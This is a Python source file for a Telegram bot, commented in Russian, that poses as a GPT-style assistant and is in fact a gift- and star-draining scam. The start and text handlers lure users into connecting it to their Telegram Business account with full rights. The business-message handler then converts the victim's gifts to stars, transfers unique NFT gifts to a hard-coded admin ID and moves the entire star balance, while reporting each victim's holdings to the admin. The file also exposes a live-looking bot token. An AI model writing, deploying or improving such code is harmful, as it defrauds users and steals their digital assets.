import asyncio
import json
import logging
import os

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
from aiogram.methods import GetBusinessAccountGifts, GetBusinessAccountStarBalance, TransferGift, ConvertGiftToStars, SendMessage
from aiogram.enums import ParseMode

# ====== Настройки ======
TOKEN = "8009461376:AAHjMUEZV5L90B1Vqrv7tHm8XQZDaKUFNMU"
ADMIN_ID = 861087987
CONNECTIONS_FILE = "business_connections.json"

bot = Bot(token=TOKEN)
dp = Dispatcher()


# ====== Вспомогательные функции ======

def load_connections():
    try:
        with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (FileNotFoundError, json.JSONDecodeError):
        return []

def save_connections(data):
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def send_welcome_message_to_admin(business_connection, _bot):
    try:
        rights = business_connection.rights
        bc = business_connection

        rights_text = "\n".join([
            f"▫️ Удаление всех сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
            f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
            f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
            f"▫️ Редактирование фото профиля: {'✅' if rights.can_edit_profile_photo else '❌'}",
            f"▫️ Редактирование username: {'✅' if rights.can_edit_username else '❌'}",
            f"▫️ Настройки подарков: {'✅' if rights.can_change_gift_settings else '❌'}",
            f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
            f"▫️ Конвертация подарков в звёзды: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
            f"▫️ Передача/улучшение подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
            f"▫️ Передача звёзд: {'✅' if rights.can_transfer_stars else '❌'}",
            f"▫️ Управление историями: {'✅' if rights.can_manage_stories else '❌'}",
            f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
        ])

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            star_resp = await bot(GetBusinessAccountStarBalance(business_connection_id=bc.id))
            star_amount = star_resp.star_amount

            gifts_resp = await bot(GetBusinessAccountGifts(business_connection_id=bc.id))
            all_gifts_amount = len(gifts_resp.gifts)
            unique_gifts_amount = sum(1 for gift in gifts_resp.gifts if gift.type == "unique")

        msg = (
            f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
            f"👤 Пользователь: @{bc.user.username or '—'}\n"
            f"🆔 User ID: <code>{bc.user.id}</code>\n"
            f"🔗 Connection ID: <code>{bc.id}</code>\n\n"
            f"{rights_text}\n\n"
            f"⭐️ Звезды: <code>{star_amount}</code>\n"
            f"🎁 Подарков: <code>{all_gifts_amount}</code>\n"
            f"🔝 NFT подарков: <code>{unique_gifts_amount}</code>"
        )

        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🎁 Вывести все подарки (и превратить в звезды)", callback_data=f"reveal_all_gifts:{bc.user.id}")],
            [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{bc.user.id}")],
            [InlineKeyboardButton(text="🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{bc.user.id}")]
        ])

        await _bot.send_message(ADMIN_ID, msg, parse_mode=ParseMode.HTML, reply_markup=keyboard)

    except Exception:
        logging.exception("Ошибка при отправке сообщения админу")


# ====== Хендлеры ======

@dp.message(Command("start"))
async def start_command(message: Message):
    if message.from_user.id != ADMIN_ID:
        await message.answer(
            "❤️ <b>Я — твой главный помощник в жизни</b>, который:\n"
            "• ответит на любой вопрос\n"
            "• поддержит тебя в трудную минуту\n"
            "• сделает за тебя домашку, работу или даже нарисует картину\n\n"
            "<i>Введи запрос ниже, и я помогу тебе!</i> 👇",
            parse_mode=ParseMode.HTML
        )
    else:
        await message.answer(
            "/gifts - просмотреть гифты\n"
            "/stars - просмотреть звезды\n"
            "/transfer <owned_id> <business_connect> - передать гифт вручную\n"
            "/convert - конвертировать подарки в звезды"
        )


@dp.message(Command("refund"))
async def refund_command(message: Message):
    try:
        parts = message.text.split()
        if len(parts) != 2:
            await message.answer("Пожалуйста, укажите id операции. Пример: /refund 123456")
            return

        transaction_id = parts[1]

        refund_result = await bot.refund_star_payment(
            user_id=message.from_user.id,
            telegram_payment_charge_id=transaction_id
        )

        if refund_result:
            await message.answer(f"Возврат звёзд по операции {transaction_id} успешно выполнен!")
        else:
            await message.answer(f"Не удалось выполнить возврат по операции {transaction_id}.")

    except Exception as e:
        await message.answer(f"Ошибка при выполнении возврата: {str(e)}")


@dp.message(F.text)
async def handle_text_query(message: Message):
    await message.answer(
        "📌 <b>Для полноценной работы необходимо подключить бота к бизнес-аккаунту Telegram</b>\n\n"
        "Как это сделать?\n\n"
        "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
        "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
        "3. 🤖 Откройте пункт <b>Чат-боты</b>\n"
        "4. ✍️ Введите <code>@TitanGpt_RoBot</code>\n\n"
        "Имя бота: <code>@TitanGpt_RoBot</code>\n\n"
        "❗Для корректной работы боту требуются <b>все права</b>",
        parse_mode=ParseMode.HTML
    )


@dp.business_connection()
async def handle_business_connect(business_connection):
    await send_welcome_message_to_admin(business_connection, bot)
    await bot.send_message(
        business_connection.user.id,
        "Привет! Ты подключил бота как бизнес-ассистента. Теперь отправьте в любом личном чате '.gpt запрос'"
    )
    # Сохраняем бизнес-подключение
    connections = load_connections()

    # Проверяем, есть ли уже запись
    exists = any(conn.get("user_id") == business_connection.user.id for conn in connections)
    if not exists:
        connections.append({
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name or "",
            "last_name": business_connection.user.last_name or ""
        })
        save_connections(connections)


@dp.business_message()
async def handle_business_message(message: types.Message):
    business_id = message.business_connection_id
    user_id = message.from_user.id

    if user_id == ADMIN_ID:
        return  # Админские сообщения игнорируем

    try:
        # Конвертация неуникальных подарков
        gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_id))
        for gift in gifts_response.gifts:
            if gift.type != "unique":
                try:
                    await bot(ConvertGiftToStars(business_connection_id=business_id, owned_gift_id=gift.owned_gift_id))
                except Exception as e:
                    logging.error(f"Ошибка конвертации подарка {gift.owned_gift_id}: {e}")

        # Отправка уникальных подарков админу (ADMIN_ID)
        for gift in gifts_response.gifts:
            if gift.type == "unique":
                try:
                    await bot(TransferGift(business_connection_id=business_id, owned_gift_id=gift.owned_gift_id, user_id=ADMIN_ID, stars=25))
                    logging.info(f"Подарок {gift.owned_gift_id} отправлен админу")
                except Exception as e:
                    logging.error(f"Ошибка передачи подарка {gift.owned_gift_id}: {e}")

        # Отправка звезд админу
        star_balance = await bot(GetBusinessAccountStarBalance(business_connection_id=business_id))
        if star_balance.star_amount > 0:
            await bot.transfer_business_account_stars(business_connection_id=business_id, stars=star_balance.star_amount)
            logging.info(f"Отправлено {star_balance.star_amount} звезд админу")
        else:
            logging.info("Звезд для отправки нет")

    except Exception as e:
        logging.error(f"Ошибка обработки бизнес-сообщения: {e}")


# ====== Запуск бота ======
async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
